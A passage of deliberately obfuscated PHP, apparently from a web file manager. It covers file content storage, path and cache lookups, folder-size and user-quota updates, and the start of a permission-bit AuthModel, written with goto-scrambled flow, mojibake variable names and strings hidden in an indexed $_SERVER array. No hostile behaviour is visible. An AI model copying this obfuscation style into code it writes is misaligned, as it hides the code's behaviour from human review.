Model($FÚ‡ÖñÁÙè[542])->eventAddDesc($B¤Äâé‚ô, $fµÚƒä‰¦«); return $this->metaSet($B¤Äâé‚ô, $FÚ‡ÖñÁÙè[440], $fµÚƒä‰¦«); } public function setContent($DÛóÔ–âÁ…, $cø¨¤•†  = '') { goto bÔÏëó¾ÉÃ; Fèô³ØÃŠ’: if (!$d‰Ÿ¯‹³ê) { return Model($DÊá†îëª[459])->remove($fä‰…ë½È[$DÊá†îëª[456]]); } $this->folderSizeReset($e©èÊ²©È[$DÊá†îëª[487]]); return !0; goto A„¸©ÖÂÀ´; bÔÏëó¾ÉÃ: $DÊá†îëª =& $_SERVER[«¾°Ã¤]; $e©èÊ²©È = $this->sourceInfo($DÛóÔ–âÁ…); $E™Âö¿ØÙ˜ = $this->fileInfoGet($DÛóÔ–âÁ…); goto cÄë…À¡Ê¿; cÄë…À¡Ê¿: if (!$E™Âö¿ØÙ˜ || !$e©èÊ²©È) { return !1; } $fä‰…ë½È = Model($DÊá†îëª[459])->addFileByContent($cø¨¤•† , $e©èÊ²©È[$DÊá†îëª[28]]); $d‰Ÿ¯‹³ê = $this->fileHistory($e©èÊ²©È, $fä‰…ë½È[$DÊá†îëª[456]], $fä‰…ë½È[$DÊá†îëª[78]]); goto Fèô³ØÃŠ’; A„¸©ÖÂÀ´: } public function fileSubstr($b‘ƒà¨ÕÛ, $f…§ÕÕ¯–, $C ×Œ¬ˆ˜É) { $BØ”„¸¤¡ = $this->fileInfoGet($b‘ƒà¨ÕÛ); if (!$BØ”„¸¤¡) { return !1; } return IO::fileSubstr($BØ”„¸¤¡[$_SERVER[«¾°Ã¤][76]], $f…§ÕÕ¯–, $C ×Œ¬ˆ˜É); } public function fileInfoGet($AÛ½²»ÍêÒ) { goto c¤Ş’¯ÏÔ«; bÇŞ´êä¢ƒ: return $Bæ–˜ñÔñÏ; goto d¦Êã±Ã©ğ; c¤Ş’¯ÏÔ«: $B´·’óÀ¸– =& $_SERVER[«¾°Ã¤]; $Aç¥òˆâñ‡ = $this->sourceInfo($AÛ½²»ÍêÒ); if (!$Aç¥òˆâñ‡ || $Aç¥òˆâñ‡[$B´·’óÀ¸–[412]]) { return !1; } goto cˆÜÂ‚ÌÚ; f˜«õ¦Òäˆ: $Bæ–˜ñÔñÏ = Model($B´·’óÀ¸–[459])->fileInfo($Aç¥òˆâñ‡[$B´·’óÀ¸–[456]]); if ($Bæ–˜ñÔñÏ) { $Bæ–˜ñÔñÏ[$B´·’óÀ¸–[28]] = $Aç¥òˆâñ‡[$B´·’óÀ¸–[28]]; } self::$cacheFileInfo[$Dº¥Ô’½Â] = $Bæ–˜ñÔñÏ; goto bÇŞ´êä¢ƒ; cˆÜÂ‚ÌÚ: $Dº¥Ô’½Â = $B´·’óÀ¸–[462] . $Aç¥òˆâñ‡[$B´·’óÀ¸–[456]]; $c†”ßìÈ = _get(self::$cacheFileInfo, $Dº¥Ô’½Â); if ($c†”ßìÈ) { return $c†”ßìÈ; } goto f˜«õ¦Òäˆ; d¦Êã±Ã©ğ: } private function folderChildrenNumber($D¦ãÂ‡ïÈÎ) { $DĞÈèºÃô =& $_SERVER[«¾°Ã¤]; $A’‘ø«Ë»± = $this->sourceInfo($D¦ãÂ‡ïÈÎ); $eËŒğ„Î¤® = array($DĞÈèºÃô[562] => array($DĞÈèºÃô[521], $A’‘ø«Ë»±[$DĞÈèºÃô[496]] . $D¦ãÂ‡ïÈÎ . $DĞÈèºÃô[522]), $DĞÈèºÃô[431] => intval($A’‘ø«Ë»±[$DĞÈèºÃô[432]]), $DĞÈèºÃô[555] => 1); $C²¸ª³—³Î = $this->where($eËŒğ„Î¤®)->count(); $fŞ¶éÂÒİ = $this->where($eËŒğ„Î¤®)->where(array($DĞÈèºÃô[555] => 0))->count(); return array($DĞÈèºÃô[82] => $fŞ¶éÂÒİ, $DĞÈèºÃô[83] => $C²¸ª³—³Î); } public function pathInfo($a ¦šÅ´øÍ, $B¢›Â¶•ò = false) { goto bºàœœœñ˜; c˜ÚËš¥¡: self::$cachePathInfo[$EÎÜà…Ó¯á] = $B‚†‘Ùí‡; return $B‚†‘Ùí‡; goto f™ë¹—¼ ¹; fœŸŒÄ‰Ò¢: $B‚†‘Ùí‡ = $this->sourceInfo($a ¦šÅ´øÍ); if (!$B‚†‘Ùí‡) { return !1; } $B‚†‘Ùí‡ = $this->_listDataApplyItem($B‚†‘Ùí‡, $B¢›Â¶•ò); goto c˜ÚËš¥¡; bºàœœœñ˜: $dëº³²êá¬ =& $_SERVER[«¾°Ã¤]; $B¢›Â¶•ò = !1; $a ¦šÅ´øÍ = intval($a ¦šÅ´øÍ); goto Eå¸Ğ½ëÅå; Eå¸Ğ½ëÅå: $EÎÜà…Ó¯á = $dëº³²êá¬[448] . intval($B¢›Â¶•ò) . $dëº³²êá¬[449] . $a ¦šÅ´øÍ; $BÙ©å¸ªÀ‡ = _get(self::$cachePathInfo, $EÎÜà…Ó¯á); if ($BÙ©å¸ªÀ‡) { return $BÙ©å¸ªÀ‡; } goto fœŸŒÄ‰Ò¢; f™ë¹—¼ ¹: } public static $cachePathInfoMore = array(); public function pathInfoMore($E¾òãàÔ•) { goto d†™ö¤Æãæ; d†™ö¤Æãæ: $f¶ÚÖ‹¾ñ =& $_SERVER[«¾°Ã¤]; $b‘øô¥Ì·ğ = _get(self::$cachePathInfoMore, $E¾òãàÔ•); if ($b‘øô¥Ì·ğ) { return $b‘øô¥Ì·ğ; } goto FÔ¬¥áÀˆ; b¾Ö“æñ: self::$cachePathInfoMore[$E¾òãàÔ•] = $féˆáŸ¢‡; return $féˆáŸ¢‡; goto a½ì¶‚‚‚é; FÔ¬¥áÀˆ: $féˆáŸ¢‡ = $this->pathInfo($E¾òãàÔ•); if (!$féˆáŸ¢‡) { return !1; } if ($féˆáŸ¢‡[$f¶ÚÖ‹¾ñ[412]] == $f¶ÚÖ‹¾ñ[87]) { $féˆáŸ¢‡[$f¶ÚÖ‹¾ñ[81]] = $this->folderChildrenNumber($E¾òãàÔ•); } goto b¾Ö“æñ; a½ì¶‚‚‚é: } public function sourceInfo($C‚¡¨¨²™Š) { goto EÄ£……æÓî; EÄ£……æÓî: $cŠ´ê˜öô =& $_SERVER[«¾°Ã¤]; if (!$C‚¡¨¨²™Š) { return array(); } $C‚¡¨¨²™Š = intval($C‚¡¨¨²™Š); goto c©êÃ°°²; AŸÎÑÍÛë: $Eï„ÕÁ¥® = $this->where(array($cŠ´ê˜öô[404] => $C‚¡¨¨²™Š))->find(); self::$cacheSourceInfo[$Bß’Ä‘—ÎĞ] = $Eï„ÕÁ¥®; return self::$cacheSourceInfo[$Bß’Ä‘—ÎĞ]; goto d›¡´ ¼¢; c©êÃ°°²: $Bß’Ä‘—ÎĞ = $cŠ´ê˜öô[447] . $C‚¡¨¨²™Š; $A¦Ş“ğÛ§¤ = _get(self::$cacheSourceInfo, $Bß’Ä‘—ÎĞ); if ($A¦Ş“ğÛ§¤) { return $A¦Ş“ğÛ§¤; } goto AŸÎÑÍÛë; d›¡´ ¼¢: } public function sourceCacheClear($a‰„õŒ = false) { self::cacheClear($a‰„õŒ); } public static function cacheClear($E­Æ¼¬å™Ì = false) { $d¢Ş™‘éÉ =& $_SERVER[«¾°Ã¤]; if ($E­Æ¼¬å™Ì == !1) { goto aŠƒÒÜ§áØ; d”ˆ¯îÏŒß: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto Bçæ”ÖÏğ; aŠƒÒÜ§áØ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto d”ˆ¯îÏŒß; Bçæ”ÖÏğ: return; goto FÕÔøœØ‡æ; FÕÔøœØ‡æ: } unset(self::$cacheSourceInfo[$d¢Ş™‘éÉ[447] . $E­Æ¼¬å™Ì]); unset(self::$cachePathInfoMore[$E­Æ¼¬å™Ì]); unset(self::$cachePathInfo[$d¢Ş™‘éÉ[1978] . $E­Æ¼¬å™Ì]); unset(self::$cachePathInfo[$d¢Ş™‘éÉ[1979] . $E­Æ¼¬å™Ì]); } public function metaSet($bÂÎ°å®Êå, $fóÓ—ºÑ‘ = null, $bÅƒ“õå… = null) { $cÇÎäÉæ‰á = parent::metaSet($bÂÎ°å®Êå, $fóÓ—ºÑ‘, $bÅƒ“õå…); if ($cÇÎäÉæ‰á) { $this->sourceCacheClear($bÂÎ°å®Êå); } return $cÇÎäÉæ‰á; } public function pathInfoByPath($F¼½î¨Æ“, $B»¡Êæ¶Ùø) { $e¢ù†»Íä¹ =& $_SERVER[«¾°Ã¤]; $D»ÀÍõÛŠø = !$B»¡Êæ¶Ùø ? array() : explode($e¢ù†»Íä¹[8], trim($B»¡Êæ¶Ùø, $e¢ù†»Íä¹[8])); $fç¾¥šÏ = $F¼½î¨Æ“; foreach ($D»ÀÍõÛŠø as $cò„òíö¼) { $eæ²©±Øà´ = array($e¢ù†»Íä¹[487] => $fç¾¥šÏ, $e¢ù†»Íä¹[28] => $cò„òíö¼); $b¿ø¦¥óà = $this->where($eæ²©±Øà´)->select(); if (!$b¿ø¦¥óà) { return !1; } $b¿ø¦¥óà = array_sort_by($b¿ø¦¥óà, $e¢ù†»Íä¹[432]); $fç¾¥šÏ = $b¿ø¦¥óà[0][$e¢ù†»Íä¹[404]]; } return $this->pathInfo($fç¾¥šÏ, !0); } protected function updateModifyTime($AˆÆö£”‘Â) { goto dØŞÉ”ô‰œ; cœÊãË¶Œ: $this->where($cŒÃæó¬‡Í)->save($a¥Æ‘Ó‘ñ); goto f‰½ö‚©ÇÔ; EçÑ¾ù™Å–: foreach ($AˆÆö£”‘Â as $F¶‘¬‘Ï†– => $a¬óˆŒĞ“Û) { $AˆÆö£”‘Â[$F¶‘¬‘Ï†–] = intval($a¬óˆŒĞ“Û); $this->sourceCacheClear($a¬óˆŒĞ“Û); } $cŒÃæó¬‡Í = array($cô“µ‹‚½ƒ[404] => array($cô“µ‹‚½ƒ[7], $AˆÆö£”‘Â)); $a¥Æ‘Ó‘ñ = array($cô“µ‹‚½ƒ[561] => USER_ID, $cô“µ‹‚½ƒ[426] => time()); goto cœÊãË¶Œ; dØŞÉ”ô‰œ: $cô“µ‹‚½ƒ =& $_SERVER[«¾°Ã¤]; if (!$AˆÆö£”‘Â) { return; } if (!is_array($AˆÆö£”‘Â)) { $AˆÆö£”‘Â = array($AˆÆö£”‘Â); } goto EçÑ¾ù™Å–; f‰½ö‚©ÇÔ: } public function folderSizeReset($f„âÛ‚øŒÂ, $d†ª™ò—‡Ê = false) { goto aîœ†‘Å¡¼; C£¥ê•Ô¶·: $EÆÉœ¤¢ê­[] = $dƒÜŠãÖè±[$eÒÌĞ ‹ö°[404]]; $e“‹¹“ñÃÎ = array($eÒÌĞ ‹ö°[404] => array($eÒÌĞ ‹ö°[420], $EÆÉœ¤¢ê­)); if ($d†ª™ò—‡Ê < 0) { $e“‹¹“ñÃÎ[$eÒÌĞ ‹ö°[78]] = array($eÒÌĞ ‹ö°[973], abs($d†ª™ò—‡Ê)); } goto FÉÃ«…Ø™; CÏäô¬å‡É: $AÃ´çäßÍ¸ = array($dƒÜŠãÖè±[$eÒÌĞ ‹ö°[413]], $dƒÜŠãÖè±[$eÒÌĞ ‹ö°[493]]); TaskRun::timeLimitCall($Dã‚Šíã›, $eÒÌĞ ‹ö°[1982], $AÃ´çäßÍ¸, 1.5); goto e®Û“öß‰Ç; D—ÕæØ¡ÇÇ: if ($d†ª™ò—‡Ê == 0) { return CacheLock::unlock($eŒˆŒÈå); } $EÆÉœ¤¢ê­ = $this->parentLevelArray($dƒÜŠãÖè±[$eÒÌĞ ‹ö°[496]]); if (!$EÆÉœ¤¢ê­) { $EÆÉœ¤¢ê­ = array(); } goto C£¥ê•Ô¶·; aîœ†‘Å¡¼: $eÒÌĞ ‹ö° =& $_SERVER[«¾°Ã¤]; if ($this->statusIgnoreResetSpace) { return; } $dƒÜŠãÖè± = $this->sourceInfo($f„âÛ‚øŒÂ); goto a¯¬¿«³œ; a¯¬¿«³œ: $eŒˆŒÈå = $eÒÌĞ ‹ö°[1980] . $f„âÛ‚øŒÂ; CacheLock::lock($eŒˆŒÈå, 20); if ($d†ª™ò—‡Ê === !1) { $this->sourceCacheClear($f„âÛ‚øŒÂ); $dƒÜŠãÖè± = $this->sourceInfo($f„âÛ‚øŒÂ); $e“‹¹“ñÃÎ = array($eÒÌĞ ‹ö°[403] => $f„âÛ‚øŒÂ, $eÒÌĞ ‹ö°[431] => 0); $B¤µ‹âŒğä = $this->where($e“‹¹“ñÃÎ)->sum($eÒÌĞ ‹ö°[78]); $d†ª™ò—‡Ê = intval($B¤µ‹âŒğä) - intval($dƒÜŠãÖè±[$eÒÌĞ ‹ö°[78]]); } goto D—ÕæØ¡ÇÇ; FÉÃ«…Ø™: $this->where($e“‹¹“ñÃÎ)->setAdd($eÒÌĞ ‹ö°[78], $d†ª™ò—‡Ê); CacheLock::unlock($eŒˆŒÈå); $Dã‚Šíã› = $eÒÌĞ ‹ö°[1981] . $dƒÜŠãÖè±[$eÒÌĞ ‹ö°[413]] . $eÒÌĞ ‹ö°[4] . $dƒÜŠãÖè±[$eÒÌĞ ‹ö°[493]]; goto CÏäô¬å‡É; e®Û“öß‰Ç: } public function folderSizeResetChildren($A†Ì›ïÈ¸ë) { goto fÙ‹‘¯¥•; EÍ¼÷Ù¢¹ˆ: $D¨¤Ş¶©â– = array($bŠ¤¬ÂÑ‡Ë[555] => 1, $bŠ¤¬ÂÑ‡Ë[562] => array($bŠ¤¬ÂÑ‡Ë[521], $fƒˆç‰ƒÉñ[$bŠ¤¬ÂÑ‡Ë[496]] . $A†Ì›ïÈ¸ë . $bŠ¤¬ÂÑ‡Ë[522])); $då‰˜ëœ‰¢ = $bŠ¤¬ÂÑ‡Ë[1983]; $c£Š†ÑñŞ‹ = $this->field($då‰˜ëœ‰¢)->where($D¨¤Ş¶©â–)->select(); goto AËÁçĞ§Õ‹; FõŠåÒÍ ›: foreach ($c£Š†ÑñŞ‹ as $e·œ’¶¯³›) { if ($e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[78]] == $e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[1984]]) { continue; } $b§ÀøÇ„ôâ[] = array($bŠ¤¬ÂÑ‡Ë[404], $e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[404]], $bŠ¤¬ÂÑ‡Ë[78], $e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[78]]); } $this->saveAll($b§ÀøÇ„ôâ); goto dÚ†óÎ§±ƒ; fÙ‹‘¯¥•: $bŠ¤¬ÂÑ‡Ë =& $_SERVER[«¾°Ã¤]; $this->sourceCacheClear($A†Ì›ïÈ¸ë); $fƒˆç‰ƒÉñ = $this->sourceInfo($A†Ì›ïÈ¸ë); goto EÍ¼÷Ù¢¹ˆ; fÊ­‰ê’ìä: foreach ($Aøß±›Ú­º as $e·œ’¶¯³›) { $Dö¯¬÷Ò•£ = $e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[487]] . $bŠ¤¬ÂÑ‡Ë[33]; if (!isset($c£Š†ÑñŞ‹[$Dö¯¬÷Ò•£])) { continue; } if ($e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[432]] == $c£Š†ÑñŞ‹[$Dö¯¬÷Ò•£][$bŠ¤¬ÂÑ‡Ë[432]]) { $c£Š†ÑñŞ‹[$Dö¯¬÷Ò•£][$bŠ¤¬ÂÑ‡Ë[78]] += $e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[78]]; } } foreach ($c£Š†ÑñŞ‹ as $e·œ’¶¯³›) { $C’‰§»—¥ˆ = $this->parentLevelArray($e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[496]]); foreach ($C’‰§»—¥ˆ as $Dö¯¬÷Ò•£) { $Dö¯¬÷Ò•£ = $Dö¯¬÷Ò•£ . $bŠ¤¬ÂÑ‡Ë[33]; if (!isset($c£Š†ÑñŞ‹[$Dö¯¬÷Ò•£])) { continue; } if ($e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[432]] == $c£Š†ÑñŞ‹[$Dö¯¬÷Ò•£][$bŠ¤¬ÂÑ‡Ë[432]]) { $c£Š†ÑñŞ‹[$Dö¯¬÷Ò•£][$bŠ¤¬ÂÑ‡Ë[78]] += $e·œ’¶¯³›[$bŠ¤¬ÂÑ‡Ë[78]]; } } } $b§ÀøÇ„ôâ = array(); goto FõŠåÒÍ ›; e‘ÈØ±à‘Û: $c£Š†ÑñŞ‹[] = $fƒˆç‰ƒÉñ; $c£Š†ÑñŞ‹ = array_to_keyvalue($c£Š†ÑñŞ‹, $bŠ¤¬ÂÑ‡Ë[404]); foreach ($c£Š†ÑñŞ‹ as $CÔã ïÖß× => $e·œ’¶¯³›) { $c£Š†ÑñŞ‹[$CÔã ïÖß×][$bŠ¤¬ÂÑ‡Ë[1984]] = $c£Š†ÑñŞ‹[$CÔã ïÖß×][$bŠ¤¬ÂÑ‡Ë[78]]; $c£Š†ÑñŞ‹[$CÔã ïÖß×][$bŠ¤¬ÂÑ‡Ë[78]] = 0; } goto fÊ­‰ê’ìä; AËÁçĞ§Õ‹: $D¨¤Ş¶©â–[$bŠ¤¬ÂÑ‡Ë[412]] = 0; $Aøß±›Ú­º = $this->field($då‰˜ëœ‰¢)->where($D¨¤Ş¶©â–)->select(); if (!$Aøß±›Ú­º) { return; } goto e‘ÈØ±à‘Û; dÚ†óÎ§±ƒ: } public function userSpaceReset($a½ˆŠŠİ©» = false) { $B·çè²ÎŠÓ =& $_SERVER[«¾°Ã¤]; $aÄµ¥é«˜Ã = $this->where(array($B·çè²ÎŠÓ[413] => self::TYPE_USER, $B·çè²ÎŠÓ[493] => $a½ˆŠŠİ©», $B·çè²ÎŠÓ[412] => 0))->sum($B·çè²ÎŠÓ[78]); $aÄµ¥é«˜Ã = !$aÄµ¥é«˜Ã || $aÄµ¥é«˜Ã <= 0 ? 0 : $aÄµ¥é«˜Ã; Model($B·çè²ÎŠÓ[511])->userEdit($a½ˆŠŠİ©», array($B·çè²ÎŠÓ[1679] => $aÄµ¥é«˜Ã)); } public function targetSpaceUpdate($cÃäåš¿«, $eˆ¹â®ÅØ) { $EŒ™´…îÕ =& $_SERVER[«¾°Ã¤]; if (!$eˆ¹â®ÅØ) { return; } if (!in_array($cÃäåš¿«, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $EÔª‹óó¾î = $this->targetSpaceSize($cÃäåš¿«, $eˆ¹â®ÅØ); if ($cÃäåš¿« == self::TYPE_USER) { Model($EŒ™´…îÕ[511])->userEdit($eˆ¹â®ÅØ, array($EŒ™´…îÕ[1679] => $EÔª‹óó¾î)); } else { if ($cÃäåš¿« == self::TYPE_GROUP) { Model($EŒ™´…îÕ[495])->groupEdit($eˆ¹â®ÅØ, array($EŒ™´…îÕ[1679] => $EÔª‹óó¾î)); } } } public function targetSpaceSize($BÒ‚¼ï–è», $d¨·Úï§) { goto dª— Ì°–´; AÄ¥¦äâÑù: $c¿Ç‘¾À´œ = !$c¿Ç‘¾À´œ || $c¿Ç‘¾À´œ <= 0 ? 0 : $c¿Ç‘¾À´œ; return $c¿Ç‘¾À´œ; goto Eô¾·æ•–İ; dª— Ì°–´: $CÃº¥å½¾½ =& $_SERVER[«¾°Ã¤]; $a•ùÚÄ‡ôÆ = $this->sourceRoot($BÒ‚¼ï–è», $d¨·Úï§, !0); if (!$a•ùÚÄ‡ôÆ) { return 0; } goto F£„Œ®‹”×; F£„Œ®‹”×: $c¿Ç‘¾À´œ = floatval($a•ùÚÄ‡ôÆ[$CÃº¥å½¾½[78]]); $AÏğÑ“¤²‘ = array($CÃº¥å½¾½[562] => array($CÃº¥å½¾½[521], $CÃº¥å½¾½[507] . $a•ùÚÄ‡ôÆ[$CÃº¥å½¾½[404]] . $CÃº¥å½¾½[522])); $d…æÄÉ´İö = Model($CÃº¥å½¾½[430])->field($CÃº¥å½¾½[419])->where($AÏğÑ“¤²‘)->select(); goto DìŒ«ìÂ„ø; DìŒ«ìÂ„ø: $d…æÄÉ´İö = array_to_keyvalue($d…æÄÉ´İö, $CÃº¥å½¾½[33], $CÃº¥å½¾½[404]); $d…æÄÉ´İö = array_unique(array_filter($d…æÄÉ´İö)); if ($d…æÄÉ´İö) { $AÏğÑ“¤²‘ = array($CÃº¥å½¾½[419] => array($CÃº¥å½¾½[420], $d…æÄÉ´İö)); $c¿Ç‘¾À´œ += floatval($this->where($AÏğÑ“¤²‘)->sum($CÃº¥å½¾½[78])); } goto AÄ¥¦äâÑù; Eô¾·æ•–İ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($fëéï²Ü) { return $this->fileTypeProfile($fëéï²Ü, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d­ë¹¡©Ò») { return $this->fileTypeProfile($d­ë¹¡©Ò», SourceModel::TYPE_GROUP); } private function fileTypeProfile($FÄó‘¼½èÜ, $cÙã¨ÁÉ¼Ì) { goto c»ôˆË¡…ª; c»ôˆË¡…ª: $D§‘¿ŠÛ•É =& $_SERVER[«¾°Ã¤]; $FÚôÈÅ¶ù© = $D§‘¿ŠÛ•É[1985] . $FÄó‘¼½èÜ . $D§‘¿ŠÛ•É[71] . $cÙã¨ÁÉ¼Ì; $f½ïËÔæ¾è = Cache::get($FÚôÈÅ¶ù©); goto B‰•ÄˆÎğî; D¤ÈŞ ƒìæ: foreach ($d‹«‚âã™ as $DÙÌ¶›Ï©“ => $a¯¼²¼ÄÕİ) { $d½ÀÚËÜµ[$D§‘¿ŠÛ•É[414]] = $this->fileTypeWhere($DÙÌ¶›Ï©“); $BíÕŸ®¹ï[$DÙÌ¶›Ï©“] = array($D§‘¿ŠÛ•É[1987] => $a¯¼²¼ÄÕİ[$D§‘¿ŠÛ•É[28]], $D§‘¿ŠÛ•É[1988] => $this->where($d½ÀÚËÜµ)->count(), $D§‘¿ŠÛ•É[557] => $this->where($d½ÀÚËÜµ)->sum($D§‘¿ŠÛ•É[78])); } Cache::set($FÚôÈÅ¶ù©, $BíÕŸ®¹ï, 1200); return $BíÕŸ®¹ï; goto DÚ£Ãƒ™…; aÅØ«˜ÒƒŒ: $BíÕŸ®¹ï = array(); $BíÕŸ®¹ï[$D§‘¿ŠÛ•É[1986]] = array($D§‘¿ŠÛ•É[1987] => LNG($D§‘¿ŠÛ•É[1986]), $D§‘¿ŠÛ•É[1988] => $this->where($d½ÀÚËÜµ)->count(), $D§‘¿ŠÛ•É[557] => $this->where($d½ÀÚËÜµ)->sum($D§‘¿ŠÛ•É[78])); $d‹«‚âã™ = KodIO::fileTypeList(); goto D¤ÈŞ ƒìæ; B‰•ÄˆÎğî: if ($f½ïËÔæ¾è) { return $f½ïËÔæ¾è; } $d½ÀÚËÜµ = array($D§‘¿ŠÛ•É[555] => 0); if ($FÄó‘¼½èÜ != !1) { $d½ÀÚËÜµ[$D§‘¿ŠÛ•É[493]] = $FÄó‘¼½èÜ; $d½ÀÚËÜµ[$D§‘¿ŠÛ•É[413]] = $cÙã¨ÁÉ¼Ì; } goto aÅØ«˜ÒƒŒ; DÚ£Ãƒ™…: } public function fileNameExist($D÷ùÀ½ƒ, $fÏ¶ˆÇ¸‚¾) { $Få·¨ä¢â =& $_SERVER[«¾°Ã¤]; $A¹•áÛÜ»½ = $this->where(array($Få·¨ä¢â[487] => $D÷ùÀ½ƒ, $Få·¨ä¢â[28] => $fÏ¶ˆÇ¸‚¾, $Få·¨ä¢â[432] => 0))->find(); return is_array($A¹•áÛÜ»½) ? $A¹•áÛÜ»½[$Få·¨ä¢â[404]] : !1; } public function childList($C–”åÊÈîŞ) { goto dçƒÛ³Áù; EÖ ±ÁÀŸ¶: $cÊ×¹Ò„ø  = array($cˆÖì„Õ‚[487] => intval($C–”åÊÈîŞ), $cˆÖì„Õ‚[432] => 0); $cà•ÑŒ®ğñ = $this->where($cÊ×¹Ò„ø )->select(); $cà•ÑŒ®ğñ = $cà•ÑŒ®ğñ ? $cà•ÑŒ®ğñ : array(); goto BĞœ‰Æ×»; dçƒÛ³Áù: $cˆÖì„Õ‚ =& $_SERVER[«¾°Ã¤]; $Aß²ğµ¬Â = $cˆÖì„Õ‚[1963] . $C–”åÊÈîŞ; if (isset(self::$cacheChildList[$Aß²ğµ¬Â])) { return self::$cacheChildList[$Aß²ğµ¬Â]; } goto EÖ ±ÁÀŸ¶; BĞœ‰Æ×»: self::$cacheChildList[$Aß²ğµ¬Â] = $cà•ÑŒ®ğñ; foreach ($cà•ÑŒ®ğñ as $aÙì”öÄø) { $Aß²ğµ¬Â = $cˆÖì„Õ‚[447] . $aÙì”öÄø[$cˆÖì„Õ‚[404]]; self::$cacheSourceInfo[$Aß²ğµ¬Â] = $aÙì”öÄø; } return $cà•ÑŒ®ğñ; goto BŒ‰Îåğ§; BŒ‰Îåğ§: } public function fileNameAuto($eÊ¬ÍÒ„, $eó½ÍÃïù, $EöÈåÚé… = REPEAT_RENAME, $dÛù¨£ø®Ì = false) { $AÆ¾Èšç× =& $_SERVER[«¾°Ã¤]; $a„ÆóÌï´¯ = array($AÆ¾Èšç×[487] => $eÊ¬ÍÒ„, $AÆ¾Èšç×[432] => 0, $AÆ¾Èšç×[28] => array($AÆ¾Èšç×[380], $eó½ÍÃïù . $AÆ¾Èšç×[381])); $A¨Ò‚ÈÛ’ = $this->field($AÆ¾Èšç×[28])->where($a„ÆóÌï´¯)->select(); $B÷÷šë‚¿ = array_to_keyvalue($A¨Ò‚ÈÛ’, $AÆ¾Èšç×[33], $AÆ¾Èšç×[28]); return $this->fileNameAutoGet($B÷÷šë‚¿, $eó½ÍÃïù, $EöÈåÚé…, $dÛù¨£ø®Ì); } public function fileNameAutoGet($C¸á´²Å·½, $CÜÔˆ‹¾©, $cÊƒ‹„ä, $aŠ äæÛÉ…) { $d‘é†ÇÕ…¢ =& $_SERVER[«¾°Ã¤]; if ($cÊƒ‹„ä == REPEAT_REPLACE || !$C¸á´²Å·½ || !in_array_not_case($CÜÔˆ‹¾©, $C¸á´²Å·½) || $aŠ äæÛÉ… && $cÊƒ‹„ä != REPEAT_RENAME_FOLDER) { return $CÜÔˆ‹¾©; } if ($cÊƒ‹„ä == REPEAT_SKIP) { return !1; } $fÇÙ»öÈ = $d‘é†ÇÕ…¢[95] . get_path_ext($CÜÔˆ‹¾©); $fÇÙ»öÈ = $fÇÙ»öÈ == $d‘é†ÇÕ…¢[95] || $aŠ äæÛÉ… ? $d‘é†ÇÕ…¢[33] : $fÇÙ»öÈ; for ($D±áœÎ¡ = 1; $D±áœÎ¡ <= count($C¸á´²Å·½) + 1; $D±áœÎ¡++) { $C–…‹¸í”ˆ = substr($CÜÔˆ‹¾©, 0, strlen($CÜÔˆ‹¾©) - strlen($fÇÙ»öÈ)); $aÒä…ÁˆÜ = $C–…‹¸í”ˆ . "\x28{$D±áœÎ¡}\x29{$fÇÙ»öÈ}"; if (!in_array_not_case($aÒä…ÁˆÜ, $C¸á´²Å·½)) { return $aÒä…ÁˆÜ; } } } } goto B×‹ÅçñÛ‡; E”®¬¹•éµ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $eñÙ”ŠÊ§ =& $_SERVER[«¾°Ã¤]; $B„„ÊÜ–™¹ = array(array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1694]), $eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1696], $eñÙ”ŠÊ§[1697] => 1, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1700]), $eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1701], $eñÙ”ŠÊ§[1697] => 2, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1702]), $eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1703], $eñÙ”ŠÊ§[1697] => 3, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1704]), $eñÙ”ŠÊ§[1695] => $eñÙ”ŠÊ§[1705], $eñÙ”ŠÊ§[1697] => 4, $eñÙ”ŠÊ§[1698] => 1, $eñÙ”ŠÊ§[1699] => self::AUTH_SHOW | self::AUTH_VIEW), array($eñÙ”ŠÊ§[422] => LNG($eñÙ”ŠÊ§[1706]), 